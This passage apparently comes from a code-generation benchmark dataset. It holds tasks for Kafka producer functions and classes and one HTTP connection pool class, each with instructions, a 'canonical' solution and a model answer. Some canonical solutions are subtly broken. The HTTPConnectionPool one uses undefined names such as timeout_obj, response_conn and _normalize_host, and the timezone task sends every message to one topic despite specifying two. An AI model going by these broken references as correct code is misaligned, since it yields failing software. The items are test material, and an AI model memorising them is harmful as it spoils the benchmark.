    "right_result": "from kafka import KafkaProducer\nimport json\n\nclass CompositeItemConverter:\n    def __init__(self, converters):\n        self.converters = converters\n\n    def convert(self, item):\n        for converter in self.converters:\n            item = converter(item)\n        return item\n\nclass KafkaItemExporter:\n    def __init__(self, output: str, item_type_to_topic_mapping: dict, converters: tuple = ()):\n        self.connection_url = self.get_connection_url(output)\n        self.item_type_to_topic_mapping = item_type_to_topic_mapping\n        self.converter = CompositeItemConverter(converters)\n        self.producer = KafkaProducer(\n            bootstrap_servers=self.connection_url,\n            value_serializer=lambda v: json.dumps(v).encode('utf-8')\n        )\n\n    def get_connection_url(self, output: str) -> str:\n        return output.split(\"://\", 1)[1].split(\"/\", 1)[0]\n\n    def export_items(self, items: list) -> None:\n        for item in items:\n            self.export_item(item)\n\n    def export_item(self, item: dict) -> None:\n        item_type = item.get('type')\n        topic = self.item_type_to_topic_mapping.get(item_type)\n        if not topic:\n            raise ValueError(f\"No topic found for item type: {item_type}\")\n        converted_item = self.converter.convert(item)\n        self.producer.send(topic, value=converted_item)\n\n    def close(self) -> None:\n        pass"
  },
  {
    "Task_id": 252,
    "Instruction": "Task Description: Implement a Kafka message producer class in Python that can continuously send messages to a specified Kafka topic until stopped, with configurable server settings and message size.\n\nClass Description: The KafkaMessageProducer class provides functionality to send messages to a Kafka topic using a background thread. It maintains message statistics and allows graceful shutdown.\n\nAttributes:\n- producer: KafkaProducer - The Kafka producer instance for sending messages\n- topic: str - The Kafka topic to which messages will be sent\n- message: bytes - The message content to be sent (filled with '1's by default)\n- sent_count: int - Counter for tracking the number of messages sent\n- stop_event: threading.Event - Event flag to control the producer thread\n\nMethods:\n- __init__(bootstrap_servers: str = 'localhost:9092', topic: str = 'my-topic', message_size: int = 524288) -> None - Initializes the producer with server configuration, topic name, and message size\n- send_message() -> None - Sends a single message to the configured topic and increments the counter\n- run_producer() -> None - Continuously sends messages until stop_event is set, then flushes the producer\n- close() -> None - Signals the producer to stop and closes the Kafka producer connection",
    "Canonical_solution": "from kafka import KafkaProducer\nimport threading\n\nclass KafkaMessageProducer:\n    def __init__(self, bootstrap_servers='localhost:9092', topic='my-topic', message_size=524288):\n        self.producer = KafkaProducer(bootstrap_servers=bootstrap_servers)\n        self.topic = topic\n        self.message = b'1' * message_size\n        self.sent_count = 0\n        self.stop_event = threading.Event()\n\n    def send_message(self):\n        self.producer.send(self.topic, self.message)\n        self.sent_count += 1\n\n    def run_producer(self):\n        while not self.stop_event.is_set():\n            self.send_message()\n        self.producer.flush()\n\n    def close(self):\n        self.stop_event.set()\n        self.producer.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\nimport threading\nimport time\n\nclass KafkaMessageProducer:\n    def __init__(self, bootstrap_servers: str = 'localhost:9092', topic: str = 'my-topic', message_size: int = 524288) -> None:\n        self.producer = KafkaProducer(bootstrap_servers=bootstrap_servers)\n        self.topic = topic\n        self.message = b'1' * message_size\n        self.sent_count = 0\n        self.stop_event = threading.Event()\n\n    def send_message(self) -> None:\n        self.producer.send(self.topic, value=self.message)\n        self.sent_count += 1\n\n    def run_producer(self) -> None:\n        while not self.stop_event.is_set():\n            self.send_message()\n        self.producer.flush()\n\n    def close(self) -> None:\n        self.stop_event.set()\n        self.producer.close()"
  },
  {
    "Task_id": 254,
    "Instruction": "Task Description: Implement a Kafka producer function that reads data from a CSV file and sends it as JSON messages to a specified Kafka topic, with proper resource management and message delivery guarantees.\n\nFunction Description: The function reads movie rating data from a CSV file, converts each record into a JSON message, and publishes these messages to a designated Kafka topic. It includes a 30-second initial delay (to ensure Kafka broker availability), configures the producer with appropriate settings, sends messages with a small delay between them, and properly closes the producer after sending all messages. A special \"*COMMIT*\" message is sent as the final message to indicate completion.\n\nInput: None (The function uses a hardcoded CSV file path \"./dataset.csv\" and Kafka broker address \"kafka:9092\")\n\nOutput: None (The function's effect is the messages sent to the Kafka topic, not a direct return value)",
    "Canonical_solution": "import csv\nimport json\nimport time\nfrom kafka import KafkaProducer\n\ndef kafka_producer():\n    topic = \"ratings\"\n    time.sleep(30)\n    producer = KafkaProducer(\n        bootstrap_servers=[\"kafka:9092\"],\n        security_protocol=\"PLAINTEXT\",\n        api_version=(0, 10, 2),\n    )\n\n    with open(\"./dataset.csv\", newline=\"\") as csvfile:\n        dataset_reader = csv.reader(csvfile, delimiter=\",\")\n        first_line = True\n        for row in dataset_reader:\n            if first_line:\n                first_line = False\n                continue\n            message_json = {\n                \"userId\": int(row[0]),\n                \"movieId\": int(row[1]),\n                \"rating\": float(row[2]),\n                \"timestamp\": int(row[3]),\n            }\n            producer.send(topic, (json.dumps(message_json)).encode(\"utf-8\"))\n            time.sleep(0.1)\n\n    producer.send(topic, \"*COMMIT*\".encode(\"utf-8\"))\n    time.sleep(2)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "import csv\nimport json\nimport time\nfrom kafka import KafkaProducer\n\ndef send_movie_ratings_to_kafka():\n    # Initial delay to ensure Kafka broker is available\n    time.sleep(30)\n    \n    # Configure Kafka producer with message delivery guarantees\n    producer = KafkaProducer(\n        bootstrap_servers='kafka:9092',\n        acks='all',  # Ensure producer receives acknowledgment from leader and replicas\n        retries=5,   # Retry up to 5 times in case of failure\n        retry_backoff_ms=1000,  # Wait 1 second between retries\n        value_serializer=lambda v: json.dumps(v).encode('utf-8')\n    )\n    \n    # Read CSV file and send each row as JSON message\n    with open('./dataset.csv', 'r') as csvfile:\n        reader = csv.DictReader(csvfile)\n        for row in reader:\n            producer.send('movie_ratings', value=row)\n            # Small delay between messages to simulate streaming\n            time.sleep(0.1)\n    \n    # Send special commit message to indicate completion\n    producer.send('movie_ratings', value={'message': '*COMMIT*'})\n    \n    # Block until all pending messages are sent\n    producer.flush()\n    \n    # Close producer gracefully\n    producer.close()"
  },
  {
    "Task_id": 256,
    "Instruction": "Task Description: Create a Python function to interact with a Kafka producer for sending messages to a specified topic.\n\nFunction Description: The function creates a Kafka producer instance, sends messages to a specified topic, and properly closes the producer to release resources. The producer is configured with a bootstrap server and a value serializer to encode messages in UTF-8 format.\n\nInput:\n- `bootstrap_servers` (str): The address and port of the Kafka bootstrap server (e.g., \"127.0.0.1:9092\").\n- `topic` (str): The name of the Kafka topic to which the message will be sent.\n- `message_body` (dict): The message content to be sent, provided as a dictionary.\n\nOutput:\n- `producer` (KafkaProducer): An instance of the KafkaProducer configured with the specified bootstrap server and serializer. This is returned by the `create_kafka_producer` function.\n- The `send_kafka_message` function sends the message to the specified topic but does not return any value.\n- The `close_kafka_producer` function closes the producer and does not return any value.",
    "Canonical_solution": "from kafka import KafkaProducer\n\ndef create_kafka_producer():\n    producer = KafkaProducer(\n        bootstrap_servers=\"127.0.0.1:9092\",\n        value_serializer=lambda v: str(v).encode(\"utf-8\"),\n    )\n    return producer\n\ndef send_kafka_message(producer, topic, message_body):\n    producer.send(topic, key=None, value=dict(message_body))\n\ndef close_kafka_producer(producer):\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\nimport json\n\ndef create_kafka_producer(bootstrap_servers):\n    producer = KafkaProducer(\n        bootstrap_servers=bootstrap_servers,\n        value_serializer=lambda v: json.dumps(v).encode('utf-8')\n    )\n    return producer\n\ndef send_kafka_message(producer, topic, message_body):\n    producer.send(topic, value=message_body)\n\ndef close_kafka_producer(producer):\n    producer.close()"
  },
  {
    "Task_id": 257,
    "Instruction": "Task Description: Implement a Kafka producer class that writes JSON data to a Kafka topic with batch processing capabilities, including size-based and time-based batch commits, and a total message limit.\n\nClass Description: KafkaWriter is a class that handles writing messages to a Kafka topic with configurable batch processing. It manages batch commits based on either reaching a maximum batch size or a maximum batch lifetime, and can automatically close after sending a specified total number of messages.\n\nAttributes:\n_max_batch_size: [int] - Maximum number of messages in a batch before committing\n_max_batch_lifetime: [datetime.timedelta] - Maximum duration a batch can exist before committing\n_limit: [int] - Total number of messages to write before finishing\n_total_written: [int] - Counter for total messages written\n_total_written_after_commit: [int] - Counter for messages written since last commit\n_last_commit_at: [datetime.datetime] - Timestamp of last commit\n_current_seq_id: [int] - Sequence ID for tracking batches\n_producer: [KafkaProducer] - Kafka producer instance for message sending\n\nMethods:\n__init__(max_batch_size: int, max_batch_lifetime_sec: int, limit: int) -> None - Initializes the KafkaWriter with batch size, batch lifetime in seconds, and total message limit\nwrite(json_data: dict) -> None - Writes JSON data to Kafka topic, handles batch committing based on size or time thresholds\nclose() -> None - Properly closes the Kafka producer to release resources",
    "Canonical_solution": "from kafka import KafkaProducer\nimport json\nimport datetime\nimport os\n\nclass KafkaWriter:\n    def __init__(self, max_batch_size, max_batch_lifetime_sec, limit):\n        self._max_batch_size = max_batch_size\n        self._max_batch_lifetime = datetime.timedelta(seconds=max_batch_lifetime_sec)\n        self._limit = limit\n\n        self._total_written = 0\n        self._total_written_after_commit = 0\n        self._last_commit_at = None\n        self._current_seq_id = 0\n\n        self._producer = KafkaProducer(bootstrap_servers=[\"kafka:9092\"])\n\n    def write(self, json_data):\n        self._producer.send(\n            \"test_0\",\n            json.dumps(json_data).encode(\"utf-8\"),\n            partition=0,\n        )\n\n        if not self._last_commit_at:\n            self._last_commit_at = datetime.datetime.now()\n\n        self._total_written += 1\n        self._total_written_after_commit += 1\n        batch_exists_for = datetime.datetime.now() - self._last_commit_at\n\n        size_limit_reached = self._total_written_after_commit == self._max_batch_size\n        duration_limit_reached = batch_exists_for >= self._max_batch_lifetime\n\n        if size_limit_reached or duration_limit_reached:\n            self._last_commit_at = datetime.datetime.now()\n            self._producer.send(\n                \"test_0\",\n                \"*COMMIT*\".encode(\"utf-8\"),\n                partition=0,\n            )\n            self._total_written_after_commit = 0\n            self._current_seq_id += 1\n\n        if self._total_written == self._limit:\n            self._producer.send(\n                \"test_0\",\n                \"*FINISH*\".encode(\"utf-8\"),\n                partition=0,\n            )\n            self._producer.close()\n            exit(0)\n\n    def close(self):\n        self._producer.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "right_result": "from datetime import datetime, timedelta\nfrom kafka import KafkaProducer\nimport json\n\nclass KafkaWriter:\n    def __init__(self, max_batch_size: int, max_batch_lifetime_sec: int, limit: int):\n        self._max_batch_size = max_batch_size\n        self._max_batch_lifetime = timedelta(seconds=max_batch_lifetime_sec)\n        self._limit = limit\n        self._total_written = 0\n        self._total_written_after_commit = 0\n        self._last_commit_at = datetime.now()\n        self._current_seq_id = 0\n        self._producer = KafkaProducer(\n            bootstrap_servers='localhost:9092',\n            value_serializer=lambda v: json.dumps(v).encode('utf-8')\n        )\n\n    def write(self, json_data: dict) -> None:\n        if self._total_written >= self._limit:\n            return\n\n        self._producer.send('output_topic', value=json_data)\n        self._total_written += 1\n        self._total_written_after_commit += 1\n\n        now = datetime.now()\n        batch_age = now - self._last_commit_at\n\n        if self._total_written_after_commit >= self._max_batch_size or batch_age >= self._max_batch_lifetime:\n            self._producer.flush()\n            self._last_commit_at = now\n            self._total_written_after_commit = 0\n            self._current_seq_id += 1\n\n        if self._total_written >= self._limit:\n            self.close()\n\n    def close(self) -> None:\n        self._producer.flush()\n        self._producer.close()"
  },
  {
    "Task_id": 258,
    "Instruction": "Task Description: Create a function that generates and sends timestamped messages to Kafka topics with different timezone configurations.\n\nFunction Description: The function generates a stream of messages containing timestamps in two different timezones (America/New_York and Europe/Paris) and sends them randomly to two Kafka topics. Each message includes a timestamp in its respective timezone and a sequential message number. The function handles Kafka producer initialization, message generation, sending, and proper resource cleanup.\n\nInput: \n- None (The function uses internal constants for configuration)\n\nOutput: \n- None (The function's effect is sending messages to Kafka topics)\n\nNote: The function uses the following internal configurations:\n- input_size: int = 100 (number of messages to generate)\n- topic1: str = \"timezone1\" (first Kafka topic)\n- topic2: str = \"timezone2\" (second Kafka topic)\n- timezone1: ZoneInfo = ZoneInfo(\"America/New_York\")\n- timezone2: ZoneInfo = ZoneInfo(\"Europe/Paris\")\n- str_repr: str = \"%Y-%m-%d %H:%M:%S.%f %z\" (timestamp format)\n- api_version: tuple = (0, 10, 2) (Kafka API version)\n- bootstrap_servers: list = [\"kafka:9092\"] (Kafka server address)\n- security_protocol: str = \"PLAINTEXT\" (connection protocol)",
    "Canonical_solution": "import json\nimport random\nimport time\nfrom datetime import datetime\nfrom zoneinfo import ZoneInfo\nfrom kafka import KafkaProducer\n\ndef generate_stream():\n    input_size = 100\n    random.seed(0)\n    topic1 = \"timezone1\"\n    topic2 = \"timezone2\"\n    timezone1 = ZoneInfo(\"America/New_York\")\n    timezone2 = ZoneInfo(\"Europe/Paris\")\n    str_repr = \"%Y-%m-%d %H:%M:%S.%f %z\"\n    api_version = (0, 10, 2)\n\n    time.sleep(30)\n    producer1 = KafkaProducer(\n        bootstrap_servers=[\"kafka:9092\"],\n        security_protocol=\"PLAINTEXT\",\n        api_version=api_version,\n    )\n    producer2 = KafkaProducer(\n        bootstrap_servers=[\"kafka:9092\"],\n        security_protocol=\"PLAINTEXT\",\n        api_version=api_version,\n    )\n\n    def send_message(timezone: ZoneInfo, producer: KafkaProducer, i: int):\n        timestamp = datetime.now(timezone)\n        message_json = {\"date\": timestamp.strftime(str_repr), \"message\": str(i)}\n        producer.send(topic1, (json.dumps(message_json)).encode(\"utf-8\"))\n\n    for i in range(input_size):\n        if random.choice([True, False]):\n            send_message(timezone1, producer1, i)\n        else:\n            send_message(timezone2, producer2, i)\n        time.sleep(1)\n\n    time.sleep(2)\n    producer1.close()\n    producer2.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "from datetime import datetime\nfrom zoneinfo import ZoneInfo\nfrom kafka import KafkaProducer\nimport random\nimport time\n\ndef generate_and_send_timezone_messages():\n    input_size: int = 100\n    topic1: str = \"timezone1\"\n    topic2: str = \"timezone2\"\n    timezone1: ZoneInfo = ZoneInfo(\"America/New_York\")\n    timezone2: ZoneInfo = ZoneInfo(\"Europe/Paris\")\n    str_repr: str = \"%Y-%m-%d %H:%M:%S.%f %z\"\n    api_version: tuple = (0, 10, 2)\n    bootstrap_servers: list = [\"kafka:9092\"]\n    security_protocol: str = \"PLAINTEXT\"\n\n    producer = KafkaProducer(\n        bootstrap_servers=bootstrap_servers,\n        api_version=api_version,\n        security_protocol=security_protocol\n    )\n\n    for i in range(input_size):\n        timestamp1 = datetime.now(timezone1).strftime(str_repr)\n        timestamp2 = datetime.now(timezone2).strftime(str_repr)\n\n        message_number = i + 1\n        message1 = f\"{timestamp1} - Message {message_number}\".encode('utf-8')\n        message2 = f\"{timestamp2} - Message {message_number}\".encode('utf-8')\n\n        selected_topic = random.choice([topic1, topic2])\n        producer.send(selected_topic, value=message1 if selected_topic == topic1 else message2)\n\n        time.sleep(0.1)\n\n    producer.flush()\n    producer.close()"
  },
  {
    "Task_id": 26,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages HTTP connections to a specified host, handling connection creation, request execution, and response processing with support for retries, timeouts, and redirects.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP connections that provides efficient reuse of connections to a specified host. It handles connection lifecycle, request execution, error handling, and retries.\n\nAttributes:\n- scheme: str - The URL scheme (default \"http\")\n- host: str - The normalized hostname for connections\n- port: int - The port number for connections\n- timeout: Timeout - Connection and read timeout configuration\n- retries: Retry - Retry configuration for failed requests\n- proxy: str - Proxy server URL if configured\n- proxy_headers: dict - Headers for proxy connections\n- conn_kw: dict - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None\n  - Initializes the connection pool with target host and configuration\n  - Input: \n    - host: str - Target hostname\n    - port: int - Target port (optional)\n    - timeout: Timeout - Timeout configuration\n    - retries: Retry - Retry configuration\n    - _proxy: str - Proxy URL (optional)\n    - _proxy_headers: dict - Proxy headers (optional)\n    - conn_kw: dict - Additional connection parameters\n\n- _new_conn() -> HTTPConnection\n  - Creates a new HTTP connection\n  - Output: HTTPConnection - A new connection instance\n\n- _make_request(conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw) -> HTTPResponse\n  - Executes an HTTP request through the given connection\n  - Input:\n    - conn: HTTPConnection - Connection to use\n    - method: str - HTTP method (GET, POST, etc.)\n    - url: str - Target URL\n    - timeout: Timeout - Request timeout\n    - chunked: bool - Whether to use chunked transfer encoding\n  - Output: HTTPResponse - The HTTP response\n\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw) -> HTTPResponse\n  - Main method to execute HTTP requests with connection pooling\n  - Input:\n    - method: str - HTTP method\n    - url: str - Target URL\n    - body: str - Request body (optional)\n    - headers: dict - Request headers (optional)\n    - retries: Retry - Retry configuration (optional)\n    - redirect: bool - Whether to follow redirects\n    - timeout: Timeout - Request timeout\n    - chunked: bool - Use chunked transfer encoding\n  - Output: HTTPResponse - The HTTP response",
    "Canonical_solution": "import socket\nfrom socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n)\nfrom .util.connection import is_connection_dropped\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import Url, _encode_target\nfrom .util.url import _normalize_host as normalize_host\nfrom .util.url import get_host, parse_url\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = _normalize_host(host, scheme=self.scheme)\n        self._proxy_host = host.lower()\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _make_request(\n        self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw\n    ):\n        try:\n            if chunked:\n                conn.request_chunked(method, url, **httplib_request_kw)\n            else:\n                conn.request(method, url, **httplib_request_kw)\n        except (SocketTimeout, BaseSSLError) as e:\n            raise\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, \"sock\", None):\n            if read_timeout == 0:\n                raise ReadTimeoutError(\n                    self, url, \"Read timed out. (read timeout=%s)\" % read_timeout\n                )\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            raise\n\n        return httplib_response\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        chunked=False,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        destination_scheme = parsed_url.scheme\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect, default=self.retries)\n\n        if assert_same_host and not self.is_same_host(url):\n            raise HostChangedError(self, url, retries)\n\n        conn = None\n        release_this_conn = release_conn\n        http_tunnel_required = connection_requires_http_tunnel(\n            self.proxy, self.proxy_config, destination_scheme\n        )\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            if http_tunnel_required:\n                self._prepare_proxy(conn)\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers,\n                chunked=chunked,\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=response_conn,\n                retries=retries,\n                **response_kw\n            )\n\n        except (\n            TimeoutError,\n            HTTPException,\n            SocketError,\n            ProtocolError,\n            BaseSSLError,\n            SSLError,\n            CertificateError,\n        ) as e:\n            retries = retries.increment(\n                method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\n            )\n            retries.sleep()\n            conn = conn and conn.close()\n\n        finally:\n            if release_this_conn:\n                self._put_conn(conn)\n\n        if not conn:\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                redirect,\n                assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n\n        redirect_location = redirect and response.get_redirect_location()\n        if redirect_location:\n            response.drain_conn()\n            retries.sleep_for_retry(response)\n            return self.urlopen(\n                method,\n                redirect_location,\n                body,\n                headers,\n                retries=retries,\n                redirect=redirect,\n                assert_same_host=assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n\n        return response",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import socket\nfrom http.client import HTTPConnection, HTTPResponse\nfrom urllib.parse import urlparse\nfrom time import sleep\n\nclass Timeout:\n    DEFAULT_TIMEOUT = 30\n\nclass Retry:\n    def __init__(self, total=3, backoff_factor=0.5):\n        self.total = total\n        self.backoff_factor = backoff_factor\n\nclass HTTPConnectionPool:\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.scheme = \"http\"\n        self.host = host\n        self.port = port if port is not None else 80\n        self.timeout = timeout\n        self.retries = retries if retries is not None else Retry()\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n        self.pool = []\n\n    def _new_conn(self):\n        return HTTPConnection(self.host, self.port, timeout=self.timeout, **self.conn_kw)\n\n    def _make_request(self, conn, method, url, timeout=Timeout.DEFAULT_TIMEOUT, chunked=False, **httplib_request_kw):\n        conn.request(method, url, **httplib_request_kw)\n        return conn.getresponse()\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=Timeout.DEFAULT_TIMEOUT, pool_timeout=None, release_conn=None, chunked=False, **response_kw):\n        retries = retries if retries is not None else self.retries\n        redirect_count = 0\n        final_url = url\n        response = None\n\n        for i in range(retries.total + 1):\n            conn = self._new_conn()\n            try:\n                conn.connect()\n                self._make_request(conn, method, final_url, timeout=timeout, chunked=chunked)\n                response = conn.getresponse()\n                if redirect and response.status in (301, 302, 303, 307):\n                    location = response.getheader('Location')\n                    if location:\n                        final_url = location\n                        redirect_count += 1\n                        conn.close()\n                        if redirect_count > 5:\n                            raise Exception(\"Too many redirects\")\n                        continue\n                    else:\n                        break\n                break\n            except (socket.error, socket.timeout) as e:\n                if i < retries.total:\n                    sleep(retries.backoff_factor * (2 ** i))\n                    continue\n                else:\n                    raise\n            finally:\n                if release_conn is None or release_conn:\n                    conn.close()\n\n        return response"
  },
  {
    "Task_id": 260,
    "Instruction": "Task Description: Create a function that produces a message to a specified Kafka topic using the KafkaProducer from the kafka-python library.\n\nFunction Description: The function initializes a KafkaProducer instance, sends a message to the specified topic, waits for the message to be delivered, and then closes the producer to release resources.\n\nInput:  \n- bootstrap_server: str - The address of the Kafka bootstrap server (e.g., 'localhost:9092').  \n- topic: str - The name of the Kafka topic to which the message will be sent.  \n- message: bytes - The message content in bytes format.  \n\nOutput: None - The function does not return any value but ensures the message is sent to the Kafka topic.",
    "Canonical_solution": "from kafka import KafkaProducer\n\ndef produce_message(bootstrap_server: str, topic: str, message: bytes) -> None:\n    \"\"\"\n    Produces a message to a Kafka topic.\n    \n    Args:\n        bootstrap_server: Kafka bootstrap server address\n        topic: Target topic name\n        message: Message content in bytes\n    \"\"\"\n    producer = KafkaProducer(bootstrap_servers=[bootstrap_server])\n    future = producer.send(topic, message)\n    future.get(timeout=10)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\n\ndef send_kafka_message(bootstrap_server: str, topic: str, message: bytes):\n    producer = KafkaProducer(bootstrap_servers=bootstrap_server)\n    future = producer.send(topic, value=message)\n    future.get(timeout=10)\n    producer.close()"
  },
  {
    "Task_id": 261,
    "Instruction": "Task Description: Implement a Kafka producer function that reads data from a CSV file and sends it as JSON messages to a specified Kafka topic, with special commit markers before and after the data transmission.\n\nFunction Description: The function establishes a connection to a Kafka broker, reads movie rating data from a CSV file, converts each record to JSON format, and sends them to a predefined Kafka topic. It sends a \"*COMMIT*\" marker before and after the data transmission to indicate the start and end of the dataset. The function includes delays to ensure proper message delivery and resource cleanup.\n\nInput: None (The function uses hardcoded values for the Kafka broker configuration and file path)\n\nOutput: None (The function's effect is the messages sent to the Kafka topic)",
    "Canonical_solution": "import csv\nimport json\nimport time\nfrom kafka import KafkaProducer\n\ndef kafka_producer():\n    topic = \"ratings\"\n    time.sleep(30)\n    producer = KafkaProducer(\n        bootstrap_servers=[\"redpanda:9092\"],\n        security_protocol=\"PLAINTEXT\",\n        api_version=(0, 10, 2),\n    )\n    producer.send(topic, \"*COMMIT*\".encode(\"utf-8\"))\n    time.sleep(2)\n\n    with open(\"./dataset.csv\", newline=\"\") as csvfile:\n        dataset_reader = csv.reader(csvfile, delimiter=\",\")\n        first_line = True\n        for row in dataset_reader:\n            if first_line:\n                first_line = False\n                continue\n            message_json = {\n                \"userId\": int(row[0]),\n                \"movieId\": int(row[1]),\n                \"rating\": float(row[2]),\n                \"timestamp\": int(row[3]),\n            }\n            producer.send(topic, (json.dumps(message_json)).encode(\"utf-8\"))\n            time.sleep(0.1)\n\n    producer.send(topic, \"*COMMIT*\".encode(\"utf-8\"))\n    time.sleep(2)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\nimport csv\nimport json\nimport time\n\ndef send_csv_to_kafka():\n    bootstrap_servers = 'localhost:9092'\n    topic_name = 'movie_ratings'\n\n    producer = KafkaProducer(\n        bootstrap_servers=bootstrap_servers,\n        value_serializer=lambda v: json.dumps(v).encode('utf-8')\n    )\n\n    commit_marker = {\"marker\": \"*COMMIT*\"}\n    producer.send(topic_name, value=commit_marker)\n    \n    file_path = 'movie_ratings.csv'\n    \n    with open(file_path, mode='r', encoding='utf-8') as csvfile:\n        reader = csv.DictReader(csvfile)\n        for row in reader:\n            producer.send(topic_name, value=row)\n    \n    producer.send(topic_name, value=commit_marker)\n    \n    time.sleep(2)\n    producer.flush()\n    time.sleep(1)\n    producer.close()"
  },
  {
    "Task_id": 264,
    "Instruction": "Task Description: Create a Python function that sends messages to a Kafka topic with simulated linear regression data points.\n\nFunction Description: The function `send_kafka_messages` generates a sequence of data points following a linear pattern with slight random noise, then sends these points as JSON-encoded messages to a specified Kafka topic. It handles Kafka producer initialization with secure authentication, message sending with a delay, and proper resource cleanup.\n\nInput: None (The function uses environment variables for Kafka credentials: UPSTASH_KAFKA_USER and UPSTASH_KAFKA_PASS)\n\nOutput: None (The function's effect is sending messages to Kafka, not returning a value)",
    "Canonical_solution": "import json\nimport os\nimport random\nimport time\nfrom kafka import KafkaProducer\n\ndef send_kafka_messages():\n    topic = \"linear-regression\"\n    random.seed(0)\n\n    def get_value(i):\n        return i + (2 * random.random() - 1) / 10\n\n    kafka_endpoint = \"talented-cow-10356-eu1-kafka.upstash.io:9092\"\n    kafka_user = os.environ[\"UPSTASH_KAFKA_USER\"]\n    kafka_pass = os.environ[\"UPSTASH_KAFKA_PASS\"]\n\n    producer = KafkaProducer(\n        bootstrap_servers=[kafka_endpoint],\n        sasl_mechanism=\"SCRAM-SHA-256\",\n        security_protocol=\"SASL_SSL\",\n        sasl_plain_username=kafka_user,\n        sasl_plain_password=kafka_pass,\n        api_version=(0, 10, 2),\n    )\n\n    for i in range(10):\n        time.sleep(1)\n        payload = {\n            \"x\": i,\n            \"y\": get_value(i),\n        }\n        producer.send(topic, json.dumps(payload).encode(\"utf-8\"))\n\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "import os\nimport json\nimport time\nimport random\nfrom kafka import KafkaProducer\nfrom dotenv import load_dotenv\n\ndef send_kafka_messages():\n    load_dotenv()\n    bootstrap_servers = 'your_bootstrap_server_here'  # Replace with actual bootstrap server URL\n    topic_name = 'linear_regression_data'\n    username = os.getenv('UPSTASH_KAFKA_USER')\n    password = os.getenv('UPSTASH_KAFKA_PASS')\n\n    producer = KafkaProducer(\n        bootstrap_servers=bootstrap_servers,\n        sasl_mechanism='PLAIN',\n        sasl_plain_username=username,\n        sasl_plain_password=password,\n        security_protocol='SASL_SSL',\n        value_serializer=lambda v: json.dumps(v).encode('utf-8')\n    )\n\n    try:\n        for i in range(100):\n            x = i\n            y = 2 * x + 1 + random.uniform(-1, 1)\n            data_point = {'x': x, 'y': y}\n            producer.send(topic_name, value=data_point)\n            time.sleep(1)\n    finally:\n        producer.flush()\n        producer.close()"
  },
  {
    "Task_id": 265,
